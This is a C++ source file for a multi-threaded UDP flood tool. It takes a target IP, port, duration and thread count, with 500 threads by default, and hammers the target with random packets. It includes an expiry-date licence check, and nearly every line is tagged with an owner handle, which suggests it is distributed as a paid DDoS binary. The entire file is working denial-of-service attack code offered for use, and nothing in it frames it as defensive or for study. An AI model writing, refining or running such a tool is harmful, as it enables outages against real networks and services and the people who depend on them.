#include <iostream>//#THIS FILE OWNER IS @rajaraj_04

#include <cstring>//#THIS FILE OWNER IS @rajaraj_04

#include <cstdlib>//#THIS FILE OWNER IS @rajaraj_04

#include <ctime>//#THIS FILE OWNER IS @rajaraj_04

#include <netinet/in.h>//#THIS FILE OWNER IS @rajaraj_04

#include <arpa/inet.h>//#THIS FILE OWNER IS @rajaraj_04

#include <unistd.h>//#THIS FILE OWNER IS @rajaraj_04

#include <sys/socket.h>//#THIS FILE OWNER IS @rajaraj_04

#include <sys/types.h>//#THIS FILE OWNER IS @rajaraj_04

#include <vector>//#THIS FILE OWNER IS @rajaraj_04

#include <thread>//#THIS FILE OWNER IS @rajaraj_04

#include <mutex>//#THIS FILE OWNER IS @rajaraj_04


#define PACKET_SIZE 9999  //#THIS FILE OWNER IS @rajaraj_04

#define PAYLOAD_SIZE 1400  ////#THIS FILE OWNER IS @rajaraj_04

//#THIS FILE OWNER IS @rajaraj_04

const int EXPIRY_DAY = 20;//#THIS FILE OWNER IS @rajaraj_04

const int EXPIRY_MONTH = 12;  // //#THIS FILE OWNER IS @rajaraj_04

const int EXPIRY_YEAR = 2026;//#THIS FILE OWNER IS @rajaraj_04


//#THIS FILE OWNER IS @rajaraj_04

const int DEFAULT_THREAD_COUNT = 500;//#THIS FILE OWNER IS @rajaraj_04


//#THIS FILE OWNER IS @rajaraj_04

std::mutex log_mutex;

// Function to generate a random payload for UDP packets
void generate_payload(char *buffer, size_t size) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";//#THIS FILE OWNER IS @rajaraj_04

    for (size_t i = 0; i < size; ++i) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

//#THIS FILE OWNER IS @rajaraj_04

bool is_binary_expired() {
    time_t now = time(nullptr);
    struct tm *current_time = localtime(&now);

    if ((current_time->tm_year + 1900 > EXPIRY_YEAR) ||//#THIS FILE OWNER IS @rajaraj_04

        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||//#THIS FILE OWNER IS @rajaraj_04

        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH &&
         current_time->tm_mday > EXPIRY_DAY)) {
        return true;
    }
    return false;
}

//#THIS FILE OWNER IS @rajaraj_04

void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
    sockaddr_in server_addr{};
    char buffer[PAYLOAD_SIZE];

    // Create a UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error: Unable to create socket. " << strerror(errno) << std::endl;
        return;
    }

  //#THIS FILE OWNER IS @rajaraj_04

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error: Invalid IP address - " << ip << std::endl;
        close(sock);
        return;
    }

    //#THIS FILE OWNER IS @rajaraj_04

    generate_payload(buffer, PAYLOAD_SIZE);

    //#THIS FILE OWNER IS @rajaraj_04

    time_t start_time = time(nullptr);
    while (time(nullptr) - start_time < attack_time) {
        ssize_t sent = sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent < 0) {
            std::lock_guard<std::mutex> lock(log_mutex);
            std::cerr << "Thread " << thread_id << " - Error: Failed to send packet. " << strerror(errno) << std::endl;
        }
    }

    close(sock);
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "Thread " << thread_id << " completed its attack." << std::endl;
}

// Function to run the UDP attack in multiple threads
void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int thread_count) {
    std::vector<std::thread> threads;

    std::cout << "LAUNCHING MULTI-THREADED UDP FLOOD ATTACK WITH @rajaraj_04" << thread_count << " threads..." << std::endl;

    // Create and start threads
    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(udp_attack_thread, ip, port, attack_time, i + 1);
    }

    // Wait for all threads to finish
    for (auto &thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    std::cout << "MULTI-THREADED ATTACK COMPLETED.OWNER:- @rajaraj_04" << std::endl;
}

// Function to get the number of threads from the command line arguments or use a default value
int get_thread_count(int argc, char *argv[]) {
    if (argc == 5) {
        return std::stoi(argv[4]);  // Get thread count from argument if provided
    }
    return DEFAULT_THREAD_COUNT;  // Use default thread count if not provided
}

int main(int argc, char *argv[]) {
    if (argc != 4 && argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time> [Threads]" << std::endl;
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int thread_count = get_thread_count(argc, argv);  // Determine thread count

    // Check if the binary has expired
    if (is_binary_expired()) {
        std::cerr << "ERROR: THIS BINARY HAS EXPIRED. PLEASE CONTACT THE DEVELOPER @rajaraj_04." << std::endl;
        return EXIT_FAILURE;
    } //#THIS FILE OWNER IS @rajaraj_04

    // Perform the multi-threaded attack
    multi_threaded_udp_attack(ip, port, duration, thread_count);

    return EXIT_SUCCESS;
} //#THIS FILE OWNER IS @rajaraj_04
